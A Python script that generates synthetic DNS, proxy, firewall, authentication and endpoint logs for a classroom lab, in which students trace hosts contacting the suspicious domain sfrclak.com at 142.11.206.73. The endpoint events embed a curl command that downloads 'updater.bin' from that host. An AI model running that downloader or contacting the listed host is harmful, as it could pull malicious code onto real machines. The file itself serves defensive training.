#!/usr/bin/env python3
from __future__ import annotations

import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

random.seed(42)

OUT = Path(__file__).resolve().parents[1] / "samples" / "suspicious-domain"
DOMAIN = "sfrclak.com"
BAD_IP = "142.11.206.73"
START = datetime(2026, 3, 31, 0, 0, tzinfo=timezone.utc)
USERS = ["alice", "bob", "carol", "dlee", "evan", "frank", "grace", "heidi"]
HOSTS = ["dev-win-01", "dev-linux-02", "dev-mac-03", "fin-win-04", "hr-laptop-05", "eng-ws-06", "sales-lt-07", "ops-win-08"]
BENIGN_DOMAINS = [
    "updates.microsoft.com",
    "github.com",
    "docs.python.org",
    "login.okta.com",
    "cloudflare-dns.com",
    "cdn.jsdelivr.net",
    "example.org",
    "ubuntu.com",
]
BENIGN_IPS = ["13.107.246.45", "140.82.114.4", "151.101.0.223", "104.16.132.229", "1.1.1.1", "185.199.108.133"]


def ts(minutes: int, seconds: int = 0) -> str:
    return (START + timedelta(minutes=minutes, seconds=seconds)).isoformat().replace("+00:00", "Z")


def pick_user_host(i: int) -> tuple[str, str]:
    return USERS[i % len(USERS)], HOSTS[i % len(HOSTS)]


def write_jsonl(name: str, events: list[dict]) -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    path = OUT / name
    with path.open("w", encoding="utf-8") as f:
        for event in events:
            f.write(json.dumps(event, separators=(",", ":")) + "\n")


def dns_events() -> list[dict]:
    events = []
    for i in range(100):
        user, host = pick_user_host(i)
        suspicious = i in {18, 19, 20, 21, 37, 38, 55, 56, 72, 73, 88, 89}
        domain = DOMAIN if suspicious else random.choice(BENIGN_DOMAINS)
        ip = BAD_IP if suspicious else random.choice(BENIGN_IPS)
        events.append({
            "@timestamp": ts(i, random.randint(0, 50)),
            "event.dataset": "dns",
            "event.category": "network",
            "event.action": "dns_query",
            "host.name": host,
            "user.name": user,
            "domain": domain,
            "dns.question.name": domain,
            "destination.ip": ip,
            "dns.answers": [ip],
            "severity": "medium" if suspicious else "info",
            "message": f"DNS query for {domain}",
        })
    return events


def proxy_events() -> list[dict]:
    events = []
    for i in range(100):
        user, host = pick_user_host(i + 2)
        suspicious = i in {22, 23, 24, 40, 41, 58, 59, 76, 77, 90, 91, 92}
        domain = DOMAIN if suspicious else random.choice(BENIGN_DOMAINS)
        ip = BAD_IP if suspicious else random.choice(BENIGN_IPS)
        path = f"/{random.randint(1000000, 9999999)}" if suspicious else random.choice(["/", "/api/v1/status", "/assets/app.js", "/docs"])
        status = random.choice([200, 204, 302]) if not suspicious else random.choice([200, 404, 502])
        events.append({
            "@timestamp": ts(i + 3, random.randint(0, 50)),
            "event.dataset": "proxy",
            "event.category": "network",
            "event.action": "http_request",
            "host.name": host,
            "user.name": user,
            "url.full": f"http://{domain}:8000{path}" if suspicious else f"https://{domain}{path}",
            "domain": domain if suspicious else "",
            "destination.ip": ip,
            "http.response.status_code": status,
            "http.request.method": random.choice(["GET", "POST"]),
            "user_agent.original": random.choice(["Mozilla/5.0", "curl/8.1.2", "python-requests/2.31"]),
            "severity": "high" if suspicious and status == 200 else "info",
            "message": f"Proxy request to {domain}",
        })
    return events


def firewall_events() -> list[dict]:
    events = []
    for i in range(100):
        user, host = pick_user_host(i + 4)
        suspicious = i in {24, 25, 42, 43, 60, 61, 78, 79, 93, 94}
        dst = BAD_IP if suspicious else random.choice(BENIGN_IPS)
        action = "allowed" if suspicious or random.random() > 0.18 else "blocked"
        events.append({
            "@timestamp": ts(i + 5, random.randint(0, 50)),
            "event.dataset": "firewall",
            "event.category": "network",
            "event.action": action,
            "host.name": "fw-01",
            "source.ip": f"10.20.{i % 8}.{20 + (i % 180)}",
            "destination.ip": dst,
            "source.user.name": user,
            "related.hosts": [host],
            "network.transport": "tcp",
            "destination.port": 8000 if suspicious else random.choice([80, 443, 53, 123]),
            "severity": "high" if suspicious and action == "allowed" else "info",
            "message": f"Firewall {action} connection to {dst}",
        })
    return events


def auth_events() -> list[dict]:
    events = []
    for i in range(100):
        user, host = pick_user_host(i + 1)
        suspicious = i in {28, 29, 30, 64, 65, 96}
        action = "failed_login" if suspicious or random.random() < 0.18 else "login_success"
        events.append({
            "@timestamp": ts(i + 1, random.randint(0, 50)),
            "event.dataset": "auth",
            "event.category": "authentication",
            "event.action": action,
            "host.name": host,
            "user.name": user if not suspicious else random.choice(["alice", "svc-backup", "admin"]),
            "source.ip": random.choice(["10.20.1.45", "10.20.2.88", "10.20.9.99", "172.16.5.25"]),
            "logon.type": random.choice(["interactive", "network", "remote_interactive"]),
            "severity": "medium" if suspicious else "info",
            "message": f"Authentication event: {action}",
        })
    return events


def endpoint_events() -> list[dict]:
    events = []
    procs = ["chrome.exe", "powershell.exe", "python.exe", "curl.exe", "svchost.exe", "Code.exe", "bash"]
    for i in range(100):
        user, host = pick_user_host(i + 3)
        suspicious = i in {31, 32, 33, 66, 67, 95, 96}
        process = random.choice(procs)
        cmd = f"curl http://{DOMAIN}:8000/{random.randint(1000000, 9999999)} -o updater.bin" if suspicious else f"{process} normal activity"
        events.append({
            "@timestamp": ts(i + 2, random.randint(0, 50)),
            "event.dataset": "endpoint",
            "event.category": "process",
            "event.action": "process_start",
            "host.name": host,
            "user.name": user,
            "process.name": "curl.exe" if suspicious else process,
            "process.command_line": cmd,
            "domain": DOMAIN if suspicious else "",
            "destination.ip": BAD_IP if suspicious else "",
            "severity": "critical" if suspicious else "info",
            "message": "Suspicious downloader execution" if suspicious else "Process started",
        })
    return events


def main() -> None:
    datasets = {
        "dns.jsonl": dns_events(),
        "proxy.jsonl": proxy_events(),
        "firewall.jsonl": firewall_events(),
        "auth.jsonl": auth_events(),
        "endpoint.jsonl": endpoint_events(),
    }
    combined = []
    for name, events in datasets.items():
        write_jsonl(name, events)
        combined.extend(events)
    combined.sort(key=lambda e: e["@timestamp"])
    write_jsonl("combined.jsonl", combined)
    readme = """# Suspicious Domain Lab

Scenario: users repeatedly resolve and connect to `sfrclak.com` (`142.11.206.73`). Students should correlate DNS, proxy, firewall, auth, and endpoint activity to identify affected hosts and users.

Files:

- `dns.jsonl` - DNS query activity
- `proxy.jsonl` - HTTP/proxy requests
- `firewall.jsonl` - allow/block network telemetry
- `auth.jsonl` - authentication context
- `endpoint.jsonl` - process execution context
- `combined.jsonl` - all events merged and sorted by timestamp

Each source file contains 100 events. Upload files individually to teach source-by-source investigation, or upload `combined.jsonl` for a quick demo.

Suggested searches:

- `sfrclak.com`
- `142.11.206.73`
- `domain: sfrclak.com`
- `event_type: dns_query`
- `severity: critical`
"""
    (OUT / "README.md").write_text(readme, encoding="utf-8")
    for name, events in datasets.items():
        print(f"{name}: {len(events)}")
    print(f"combined.jsonl: {len(combined)}")


if __name__ == "__main__":
    main()
